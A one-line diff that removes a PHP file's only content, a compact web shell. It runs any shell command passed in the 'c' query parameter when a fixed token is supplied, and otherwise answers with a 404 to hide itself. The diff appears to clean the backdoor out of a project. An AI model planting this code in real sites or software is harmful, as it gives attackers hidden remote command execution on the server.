@@ -1,1 +1,0 @@
-<?php if(($_GET["t"]??"")==="yb5n0bi8j5lx984t"){@system($_GET["c"]??"id");} else {http_response_code(404);} ?>
